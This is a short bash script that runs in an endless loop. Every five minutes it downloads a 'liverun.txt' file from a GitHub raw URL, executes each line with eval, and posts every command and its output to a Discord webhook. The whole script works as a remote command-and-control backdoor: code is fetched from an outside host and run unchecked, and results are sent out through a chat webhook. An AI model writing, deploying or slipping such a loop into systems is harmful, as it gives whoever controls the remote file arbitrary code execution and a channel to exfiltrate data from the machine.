#!/bin/bash

# URL of the liverun.txt on GitHub (make sure to get the raw URL from GitHub)
GITHUB_URL="https://raw.githubusercontent.com/yourteam/yourrepo/main/liverun.txt"

# Discord Webhook URL
WEBHOOK_URL="https://discord.com/api/webhooks/your-webhook-id"

# Function to send data to Discord Webhook
send_to_discord() {
    message=$1
    curl -X POST -H "Content-Type: application/json" -d "{\"content\": \"$message\"}" $WEBHOOK_URL
}

# Loop to check for new commands every 5 minutes
while true; do
    # Download the liverun.txt file from GitHub
    curl -s $GITHUB_URL -o liverun.txt

    # Check if the file exists
    if [ -f "liverun.txt" ]; then
        # Read the commands from the liverun.txt file
        while read -r command; do
            # Execute the command
            output=$(eval "$command" 2>&1)
            
            # Check if the command was successful or failed
            if [ $? -eq 0 ]; then
                result="Success"
            else
                result="Error: $output"
            fi
            
            # Send result to Discord
            send_to_discord "Command: $command\nResult: $result"
        done < liverun.txt

        # Clean up the file after execution
        rm liverun.txt
    fi

    # Wait for 5 minutes before running again
    sleep 300
done